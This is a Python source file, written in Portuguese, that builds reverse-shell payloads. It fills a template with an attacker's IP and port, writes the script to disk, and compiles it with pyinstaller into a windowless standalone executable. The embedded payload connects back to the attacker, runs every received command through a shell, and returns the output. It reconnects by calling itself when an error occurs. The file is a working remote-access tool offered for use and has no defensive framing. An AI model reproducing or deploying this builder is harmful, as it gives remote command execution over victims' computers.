import socket
import subprocess
import os

class __CONSTRUTOR_DE_PAYLOAD__:
    def __init__(self):
        pass
    
        self.IP_DO_SERVIDOR = ''
        self.PORTA_DO_SERVIDOR = 0
        self.NOME_PAYLOAD = ''
        self.NOME_PASTA = ''
    
    def CRIAR_EXECUTAVEL_PAYLOAD(self):
        build = os.path.join(os.getcwd(), f'construtor/meus_payloads/{self.NOME_PASTA}/Build')
        os.system(f'pyinstaller --onefile --noconsole --distpath {self.caminho_pasta} --workpath {build} --specpath {self.caminho_pasta} {self.caminho_arquivo}')
        os.system('cls')
        print(f"Megalod criando com sucesso na pasta construtor/meus_payloads/{self.NOME_PASTA}")
        
    def SALVAR_NOVO_PAYLOAD(self):
        self.caminho_pasta = os.path.join(os.getcwd(), f'construtor/meus_payloads/{self.NOME_PASTA}')
        os.makedirs(self.caminho_pasta, exist_ok=True)
        self.caminho_arquivo = os.path.join(self.caminho_pasta, f"{self.NOME_PAYLOAD}.py")

        with open(self.caminho_arquivo, "w", encoding="utf-8") as arquivo:
            arquivo.write(self.codigo_modelo)
            print(f"Criando o {self.NOME_PAYLOAD}...")
            

    def CONSTRUIR_O_MODELO(self):
        self.codigo_modelo = f"""
import socket
import subprocess
import os
import sys
import platform
from datetime import datetime

# Configuração do servidor de controle (mude para o IP e porta do atacante)
SERVER_IP = '{self.IP_DO_SERVIDOR}'
SERVER_PORT = {self.PORTA_DO_SERVIDOR}

def reverse_shell():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.send(b"[+] Conexao estabelecida")
            
            
            while True:
                command = s.recv(1024).decode().strip()
                if command.lower() == "exit":
                    break
                
                elif command.lower().startswith("cd"):
                    try:
                        os.chdir(command[3:].strip())
                    except Exception as e:
                        pass
                    

                else:
                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    response = output.stdout + output.stderr
                    s.send(response.encode() if response else b"[+] Comando executado sem saida")
                
    except Exception as e:
        reverse_shell()

if __name__ == "__main__":
    reverse_shell()
"""


    def INICIAR_CONSTRUCAO(self):
        self.CONSTRUIR_O_MODELO()
        self.SALVAR_NOVO_PAYLOAD()
        self.CRIAR_EXECUTAVEL_PAYLOAD()